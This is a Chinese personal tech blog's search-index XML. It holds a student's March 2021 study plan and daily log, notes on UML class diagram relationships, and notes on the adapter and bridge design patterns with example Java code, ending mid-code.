<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>TodoList:2021-03</title>
    <url>/2021/02/23/e301ee97b31a/</url>
    <content><![CDATA[<h2 id="关于我寒假里面学习效率过低的问题"><a href="#关于我寒假里面学习效率过低的问题" class="headerlink" title="关于我寒假里面学习效率过低的问题"></a>关于我寒假里面学习效率过低的问题</h2><blockquote>
<p>因为想了想自己好像年后基本上就没怎么学东西了，即使看上去学习时间很长，但是效率真的是有些惨不忍睹，所以想了想还是需要努力提高自己的效率问题。那么大概总结了以后在学习的过程中，一些需要注意的方面。而每天结束的时候，都要看一看自己是否做到了下面的注意事项，最后将一天的学习内容和完成度记录下来，不断的提高自己的学习能力。加油，要成为一名优秀的软件工程师啊！</p>
</blockquote>
<ol>
<li><p>保证清醒的时间</p>
<ul>
<li>寒假光睡觉估计快把自己给睡傻了。所以以后作息必须严格要求自己，晚上 12:00 必须准时睡觉，寝室里小伙伴们在打游戏的话那可以适当的推迟睡觉的时间，然后按照保证大概 7.5 小时的晚上睡眠时间来规划早上起床的时间，保证不赖床！！！</li>
</ul>
</li>
<li><p>要有足够的休息。</p>
<ul>
<li>因为常常因为在出现问题的时候，会忍不住尝试一口气解决它，然后就会盯着屏幕看好几个小时，眼睛感到酸涩，头晕脑胀也舍不得停下来。但这实际上是降低了解决问题的效率的，还会有损身体健康，所以必须在软件绿屏的时候，停下来自己手头正在做的事情，去休息一小段时间。(刚刚在写下这段文字的时候就做到了，好耶！)</li>
</ul>
</li>
<li><p>要真正学懂里面的内容</p>
<ul>
<li>其实就是对于自己要学的东西，不是光看一边文档就行了（光看不思考怎么可能学会呢）。需要在看的同时使用思维导图来做笔记，从而达到强迫自己思考，最终加深理解。（自己学习的所有的东西都需要，注意是所有！）</li>
</ul>
</li>
<li><p>减少摸鱼的时间</p>
<ul>
<li>完全封禁 <code>weibo.com</code> <code>bilibili.com</code> <code>zhihu.com</code> 三个网站，只要坐在电脑面前，需要保证<strong>只能学习</strong>，绝对<strong>不做摸鱼</strong>的事情，而拿到手机，也不要漫无目的的刷新信息流，去看 bilibili 里面缓存的各种技术教程啊。以及 <a href="http://www.ruanyifeng.com/blog/">阮一峰</a> 博客上面的一些技术文章，闲暇的时候多看看嘛！</li>
</ul>
</li>
<li><p>每天一定量的运动</p>
<ul>
<li>运动是必不可少的，在学校规划到晚自习下课和 rfy 一起去操场跑步运动,要记住身体是革命的本钱哇。</li>
</ul>
</li>
<li><p>和道格的小伙伴们搞好关系</p>
<ul>
<li>虽说在一个实验室里面学习，但是到头来两个月都没有怎么说过话，想想还是要和道格的小伙伴们多交流，不然光和 IOTU 交流的话也太孤独了吧。（这个东西也要每天记录进度）</li>
</ul>
</li>
</ol>
<h2 id="关于我接下来学习方向的问题"><a href="#关于我接下来学习方向的问题" class="headerlink" title="关于我接下来学习方向的问题"></a>关于我接下来学习方向的问题</h2><blockquote>
<p>将接下来需要学习的知识点列一下，完成了就划掉。</p>
</blockquote>
<h3 id="大型阶段性目标"><a href="#大型阶段性目标" class="headerlink" title="大型阶段性目标"></a>大型阶段性目标</h3><ul>
<li><p><del>SQL 数据库的各种命令复习</del></p>
</li>
<li><p><del>JDBC 内容的学习</del></p>
</li>
<li><p><del>函数式编程</del></p>
</li>
<li><p>Java 设计模式</p>
</li>
</ul>
<h3 id="小型随意目标"><a href="#小型随意目标" class="headerlink" title="小型随意目标"></a>小型随意目标</h3><ul>
<li><p><del>Windows10 C盘目录</del></p>
</li>
<li><p><del>Windows 开机流程</del></p>
</li>
<li><p><del>编码历史和运用</del></p>
</li>
</ul>
<h2 id="每日进度记录"><a href="#每日进度记录" class="headerlink" title="每日进度记录"></a>每日进度记录</h2><h3 id="03-01"><a href="#03-01" class="headerlink" title="03-01"></a>03-01</h3><ul>
<li><p>今天第一天开学，开心的是终于回到了校园里面，学习效率可以提高了，不开心的是，上课真的是太无聊了。早上因为没有课起床比较晚，明天要 7 点半起床，起来之后直接去实验室！摸鱼的时间还是有一点，不过时间利用还是挺高的，空闲时间看了几篇技术博客。因为没有晚自习就没有运动……，还是没有和道格的小伙伴们交流QAQ。</p>
</li>
<li><p>今天主要学习了 SQL 的一些拓展命令，还有 JDBC 的一些基础用法，感觉效率同样不是特别高的样子，还需要提高啊。明天要学 SQL 事务和 JDBC 事务，加油啊！！！</p>
</li>
</ul>
<h3 id="03-02"><a href="#03-02" class="headerlink" title="03-02"></a>03-02</h3><ul>
<li><p>今天主要学了 JDBC 的大部分内容，总算把数据库相关的内容给搞结束了，好耶！早上同样因为没有课程，所以起床比较晚，运动的话，晚自习是有的，但是因为下雨了，所以就没有去跑步，明天一定！！！</p>
</li>
<li><p>学习效率仍然不是非常高，明天仍然要加油啊，函数式编程，冲啊！！！</p>
</li>
</ul>
<h3 id="03-03"><a href="#03-03" class="headerlink" title="03-03"></a>03-03</h3><ul>
<li><p>今天的学习并不是非常的顺利，我觉的最主要的原因就是因为不理解教程里面写的东西，导致学习进度非常缓慢，根本看不懂教程（或者说在看的时候并没有认真分析，只是大概看过了）。所以为了解决这个问题，决定在看教程的时候，先看视频理解整个框架，然后在<strong>细致的</strong>研究教程，并做好笔记。这里的细致研究指的是每一句话都是必须理解的，不能出现我感觉好像能理解，就放弃深究了，要明白教程上面写的每一个词语的意思！！！</p>
</li>
<li><p>其次就是摸鱼，主要是在电脑上面看视频的时候，会注意力难以集中，忍不住的开其他网页看，以后一定要改正啊！！！摸鱼真的是太浪费时间了！！！</p>
</li>
<li><p>好消息是今天没有睡懒觉，晚自习结束的时候和饶飞扬一起跑了步，还申请了学校的邮箱，以后有免费的 IDEA 白嫖了，好耶！</p>
</li>
</ul>
<h3 id="03-04"><a href="#03-04" class="headerlink" title="03-04"></a>03-04</h3><ul>
<li><p>早上去上了一节近代史就溜了，在实验室看了看昨天没弄懂的函数式编程，下午在寝室里面摸鱼看了一下午的咒术回战，晚上认真学了学（中途摸鱼看了一会肉肉姐的动态），但是学习时间太短了，虽说回寝室加了班，但还是没完成函数式编程的学习任务了（我以后再也不摸鱼了，哭.jpg）</p>
</li>
<li><p>但是晚上跑步了，和他人交流也更主动了一点，早上也没有赖床，定时休息眼睛，完全弄懂了所学的知识。emmmm，总的来说今天还是有不少收获的！</p>
</li>
<li><p>明天要加油啊！！！</p>
</li>
</ul>
<h3 id="03-05"><a href="#03-05" class="headerlink" title="03-05"></a>03-05</h3><ul>
<li>今天结束了函数式编程的学习，下午也没有做什么，晚上道格面试，人又多又杂，学不了，鸽了。</li>
</ul>
<h3 id="03-06"><a href="#03-06" class="headerlink" title="03-06"></a>03-06</h3><ul>
<li>今天上午周六，给自己放了一个小假期，和 rfy 一起伪造假条跑出去领了一张肥宅快乐卡（招商银行的花嫁卡），然后去学校北街改善了一下伙食，下午在寝室里面修养了一下，放假真的是太爽了。</li>
</ul>
<h3 id="03-07"><a href="#03-07" class="headerlink" title="03-07"></a>03-07</h3><ul>
<li>上午看了看设计模式，发现看的不是太懂，下午就回寝室下载缓存了一堆视频，为了改这一堆视频的名字，就想着写一个 Java 的脚本处理，但是遇到了关于编码的问题，于是为了一劳永逸的解决平时用到的编码问题，就开始研究字符编码的历史，运用等等。</li>
</ul>
<h3 id="03-08"><a href="#03-08" class="headerlink" title="03-08"></a>03-08</h3><ul>
<li>上午和下午一直在研究编码方面的问题，最后完成了 <a href="https://xorex.space/2021/03/07/b688fb992b28/">编码与开发</a> 这篇博客，真的可以说是一劳永逸的弄明白了开发所涉及到的编码问题，晚上继续看了设计模式，内容好多啊……</li>
</ul>
<h3 id="03-09"><a href="#03-09" class="headerlink" title="03-09"></a>03-09</h3><ul>
<li><p>混蛋，竟然在寝室里睡了一上午，以后我早上再睡懒觉我就是狗！明天早上 7:40 起床去实验室！</p>
</li>
<li><p>下午学了一下午的设计模式，感觉学习效率好低啊，要看好久才能看懂并总结好一类设计模式，好慢啊！</p>
</li>
<li><p>有了小狼给的 wifi，明天要全神贯注的学习哇！！！</p>
</li>
</ul>
<h3 id="03-10"><a href="#03-10" class="headerlink" title="03-10"></a>03-10</h3><ul>
<li><p>今天向和道格小伙伴们交流迈出了巨大的一步，但是失败了。</p>
</li>
<li><p>主要在学习新的设计模式，然而晚上加了班还没有完成。早上终于给补完了。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>行为型模式学习笔记</title>
    <url>/2021/03/16/c3540146dd4e/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>UML类图学习笔记</title>
    <url>/2021/03/15/b583afde1613/</url>
    <content><![CDATA[<h2 id="UML类图"><a href="#UML类图" class="headerlink" title="UML类图"></a>UML类图</h2><blockquote>
<p>UML类图是用来描述在面向对象设计程序的时候，各种类，接口等本身的信息和之间的联系。</p>
</blockquote>
<p>一些快速参考的资料：<a href="http://c.biancheng.net/view/8374.html">UML类图及类图之间的关系</a>、<a href="http://c.biancheng.net/view/8375.html">UML理解记忆</a> 。</p>
<h2 id="UML类之间的关系"><a href="#UML类之间的关系" class="headerlink" title="UML类之间的关系"></a>UML类之间的关系</h2><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>A 类在代码内部临时调用 B 类（通过局部实例变量，方法参数传入，或者直接调用静态方法）这种不持有 B 类，但是需要用到 B 类的关系，称为依赖关系，A 类依赖于 B 类。而依赖是单方面的依赖，</p>
<p>比如 Person 类中的 call(Phone phone) 方法需要传入 Phone 类的实例，然后内部调用实例 phone 的方法完成通话，那么就说 Person 类依赖于 Phone 类。</p>
<p>依赖关系使用带箭头的虚线来表示，箭头从使用类指向被依赖的类，关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/171.jpg"></p>
<h3 id="关联关系"><a href="#关联关系" class="headerlink" title="关联关系"></a>关联关系</h3><p>关联关系表示两个类有一定的联系，比如 Person 和 Address 之间，人拥有自己的住址，住址地方有人的存在。两者就是相互关联的关系。关联可以是单方面的关联，也可也是互相关联。被关联的类会成为关联者的一个属性。</p>
<p>单向的关联用带一个箭头的实线来表示，箭头从使用类指向被关联的类，而双向的关联可以用带两个箭头或者没有箭头的实线来表示。关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/172.jpg"></p>
<h3 id="聚合关系"><a href="#聚合关系" class="headerlink" title="聚合关系"></a>聚合关系</h3><p>当 A 类是由 B 类聚合而成的，并且 B 类可以独立于 A 类，那么称 A 和 B 的关系为聚合关系。比如雁群和大雁的关系，雁群由任意个大雁组成，而大雁可以独立于雁群，就成为大雁聚合成为了雁群。老师们聚合到了学校里面，即使学校倒闭，也可以独立存在，不会随着学校一起消亡。（被聚合个体实例创建在外部，聚合个体时通过外部传入被聚合实例，聚合体销毁的时候，被聚合体实例在外部仍然有引用，不会被回收）</p>
<p>聚合关系可以用带空心菱形的实线来表示，菱形指向整体，关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/173.jpg"></p>
<h3 id="组合关系"><a href="#组合关系" class="headerlink" title="组合关系"></a>组合关系</h3><p>组合关系需要一个类由若干个类真正组合而成，比如人是由四肢、躯干、头组成的。少了头，人就不完整了，没有了人，头也无法单独存在。这种极为紧密的关系被称为组合关系，实现这样的部分对象不能脱离整体对象的存在实现方法就是在整体的内部创建部分。这样整体一旦被销毁，部分会因为没有外部引用指向它而也被销毁。</p>
<p>组合关系用带实心菱形的实线来表示，菱形指向整体，关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/174.jpg"></p>
<h3 id="泛化关系"><a href="#泛化关系" class="headerlink" title="泛化关系"></a>泛化关系</h3><p>泛化：变得宽泛，指由个别到一般或由具体到抽象。</p>
<p>也就是说，泛化关系指的是父类和子类之间的继承关系。</p>
<p>泛化关系用带空心三角箭头的实线来表示，箭头从子类指向父类，关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/175.jpg"></p>
<h3 id="实现关系"><a href="#实现关系" class="headerlink" title="实现关系"></a>实现关系</h3><p>实现关系是接口和实现类的关系。</p>
<p>实现关系使用带空心三角箭头的虚线来表示，箭头从实现类指向接口，关系表示如下图（请勿参考图中例子）：</p>
<p><img src="https://xorex.space/image/176.jpg"></p>
<h2 id="记忆理解图"><a href="#记忆理解图" class="headerlink" title="记忆理解图"></a>记忆理解图</h2><p><img src="https://xorex.space/image/177.jpg"></p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>UML</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>结构型模式笔记</title>
    <url>/2021/03/11/41a99764aa02/</url>
    <content><![CDATA[<h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/TT2ej6" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<p>大概流程：</p>
<p><img src="https://xorex.space/image/166.jpg"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote>
<p>这里情景是 ChinaLapTop 需求 Electric220V 但是没有，只有现成的 Electric110V，那么我们就建立一个适配器 Adapter，将被适配者 Electric110V 适配为 Electric220V。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UseComputer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ChinaLapTop laptop=<span class="keyword">new</span> ChinaLapTop();</span><br><span class="line">        <span class="comment">// 这里模拟从中国带去美国的笔记本，需要 220V 的电源(ChinaElectric)</span></span><br><span class="line">        <span class="comment">// 但是没有，只有 110V 的电源(AmericaElectric)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用适配器将已有的资源转化为需要的资源</span></span><br><span class="line">        Electric110V electric=<span class="keyword">new</span> Electric110V();</span><br><span class="line">        Adapter adapter = <span class="keyword">new</span> Adapter(electric);</span><br><span class="line">        laptop.PowerOn(adapter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们需求的 ChinaElectric</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Electric220V</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getPower</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 适配器转化结果为 ChinaElectric</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">implements</span> <span class="title">Electric220V</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Electric110V USelc;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Adapter</span><span class="params">(Electric110V USelc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.USelc = USelc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPower</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> USelc.getPower()*<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 已有资源，被适配者 Adaptee</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Electric110V</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPower</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">110</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源需求者</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChinaLapTop</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChinaLapTop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I hava a China LapTop!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PowerOn</span><span class="params">(Electric220V electric)</span> </span>&#123;</span><br><span class="line">        electric.getPower();</span><br><span class="line">        System.out.println(<span class="string">&quot;Power on succeed!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
<p>参考文章：<a href="https://blog.csdn.net/dianzhenluo3164/article/details/102143836">设计模式 – 桥接模式(Bridge)</a></p>
</blockquote>
<p>桥接模式就是为了解决因为排列组合事物所有的属性而导致子类爆炸的情况。</p>
<p>比如汽车，汽车的车型有：载货汽车，牵引车，客车，轿车等等，汽车的发动机有：柴油发动机，汽油发动机，电动发动机。那么我们如果要具体的汽车，就需要把这些汽车的组合都写成类，一共就要 4*3=12 种。而且一旦有新的动力来源或者车型增加，那么增加的子类就更多了。为了解决这个问题，我们可以将这些属性抽象（<code>从众多的事物中抽取出共同的、本质性的特征</code>）为不同的维度，比如汽车里面的车型为一个维度，发动机类型为一个维度。然后通过组合两个维度来顶替一个具体的实现类来使用，这样就只需要 4+3=7 个类即可，将复杂度从 m*n 降到了 m+n 。</p>
<p>如何实现两个不同维度的组合呢？这就要说桥接模式了，用它来将两个不同的维度联系（桥接）起来。首先我们将事物属性抽象为不同的维度之后，选择其中一个维度作为抽象维度，剩下的其他维度作为实现维度。这里的选择没有具体的要求，根据取舍来选择。我们将上面的汽车属性抽象为维度：车型维度和发动机维度。然后选取车型作为抽象维度，发动机作为实现维度。</p>
<p>实现维度的每一个类都需要具体代码实现自己的功能，并让抽象维度去调用（桥接），这样来实现维度之间的结合。比如实现维度的所有类都需要用实际代码实现 <code>getPower()</code> 方法，不同的类实现不同，有的是通过烧柴油，有的是通过烧汽油。而抽象维度内部定义的统一方法的实现则是通过调用实现维度实现的方法完成的。比如抽象维度里面的越野车，里面的 <code>Drive()</code> 方法获取动力就是依靠实现类的方法 <code>getPower()</code>。</p>
<p>因此，这里的抽象维度的 抽象 就仅仅是方法内部的 <strong>一部分</strong> 需要其他人实现，是特殊意义上的抽象类和抽象方法（这个方法内部全都需要他人实现）。和 <code>从众多的事物中抽取出共同的、本质性的特征</code> 这个概念关系无关。</p>
<p>桥接的对象是两个维度，其中必定有一个维度为抽象维度，另外一个维度为实现维度。桥接之后的整体可以作为一个新的实现维度，因为不需要调用其他外部实现维度就可以实现自己的方法，所以整体可以作为新的实现维度给抽象维度调用。</p>
<p>因此，拥有复杂属性的事物，就可以用桥接组合来实现。比如一个抽象维度建立多个桥接到实现维度上，而实现维度也可以拆分为另一个抽象维度和实现维度的整体（发动机维度）。比如下图。</p>
<p><img src="https://xorex.space/image/167.jpg"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>在 Java 中的 JDBC 编程中就用到了桥接模式，实现数据库的驱动有很多，不可能让我们写的程序对每一种数据库都搞一个版本，那么我们可以将我们的程序和数据库驱动分离为两个维度，我们持有数据库驱动的接口，调用接口里面的方法来实现我们程序（抽象维度）。而实现维度为满足驱动接口的不同数据库的驱动。</p>
<p>当然这里实际的 JDBC 比桥接还多了一个设计模式，那就是抽象类获取实现类实例的时候，用到了工厂方法模式，获取实例交给工厂 DirverManager 来实现。</p>
<p><img src="https://xorex.space/image/168.jpg"></p>
<h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/da3jS3" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><p>对于桥接模型的实际实现代码，有两种不同的方式，之间的区别在于如何获取实现类的实例，分为为 组合 和 聚合。</p>
<p>组合实例：内部持有的实例是内部直接实例化出来（通过传入参数判断实例化对象）的，一旦组合类销毁，组合的实例会因为没有引用而销毁。</p>
<p>聚合实例：内部持有的实例是外部实例化（自己控制实例化对象）再传进来的，如果聚合类销毁，可能并不会影响聚合的实例，取决于外部是否还有引用指向此实例。</p>
<p>我们用会随着聚合类一起销毁的聚合方法来实现桥接吧。</p>
<p>下面实现手机抽象类和若干零部件的实现类之间的桥接。手机作为抽象类有小米子类，华为子类，桥接屏幕、和电池。屏幕又作为一个整体分为屏幕材质抽象类和分辨率抽象类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bridging</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Phone RedmiK30s = <span class="keyword">new</span> MiPhone(<span class="keyword">new</span> B5000mah(), <span class="keyword">new</span> LCD(<span class="keyword">new</span> FHD()));</span><br><span class="line">        Phone HuaweiMate40Pro = <span class="keyword">new</span> HuaweiPhone(<span class="keyword">new</span> B4400mah(),<span class="keyword">new</span> OLED(<span class="keyword">new</span> QHD()));</span><br><span class="line">        RedmiK30s.LightUp();</span><br><span class="line">        HuaweiMate40Pro.LightUp();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象类手机</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Bettary bettary;</span><br><span class="line">    <span class="keyword">protected</span> Screen screen;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(Bettary bettary, Screen screen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bettary = bettary;</span><br><span class="line">        <span class="keyword">this</span>.screen = screen;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">LightUp</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象子类小米手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MiPhone</span><span class="params">(Bettary bettary, Screen screen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bettary, screen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//小米手机业务代码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LightUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The Mi Phone is trying LightUp.&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> power = bettary.GetPower();</span><br><span class="line">        screen.returnLight(power);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象子类华为手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HuaweiPhone</span><span class="params">(Bettary bettary, Screen screen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bettary, screen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 华为手机业务代码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LightUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The HuaweiPhone is trying LightUp.&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> power = bettary.GetPower();</span><br><span class="line">        screen.returnLight(power);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独来说作为抽象类，和它的实现类 Resolution 一起就成了 Phone 的实现类了</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Resolution resolution;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Screen</span><span class="params">(Resolution resolution)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.resolution = resolution;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">returnLight</span><span class="params">(<span class="keyword">int</span> power)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OLED</span> <span class="keyword">extends</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OLED</span><span class="params">(Resolution resolution)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(resolution);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">returnLight</span><span class="params">(<span class="keyword">int</span> power)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pixel = resolution.retrunPixel();</span><br><span class="line">        System.out.println(<span class="string">&quot;Using LCD Screen with &quot;</span>+pixel+<span class="string">&quot; pixels,powered by &quot;</span>+power+<span class="string">&quot;mah bettary&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCD</span> <span class="keyword">extends</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LCD</span><span class="params">(Resolution resolution)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(resolution);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">returnLight</span><span class="params">(<span class="keyword">int</span> power)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pixel = resolution.retrunPixel();</span><br><span class="line">        System.out.println(<span class="string">&quot;Using LCD Screen with &quot;</span>+pixel+<span class="string">&quot; pixels,powered by &quot;</span>+power+<span class="string">&quot;mah bettary&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Screen 的实现类接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Resolution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">retrunPixel</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QHD</span> <span class="keyword">implements</span> <span class="title">Resolution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">retrunPixel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2772</span>*<span class="number">1344</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FHD</span> <span class="keyword">implements</span>  <span class="title">Resolution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">retrunPixel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2400</span>*<span class="number">1080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Phone 的其中一个实现类接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Bettary</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetPower</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B4400mah</span> <span class="keyword">implements</span> <span class="title">Bettary</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetPower</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4400</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 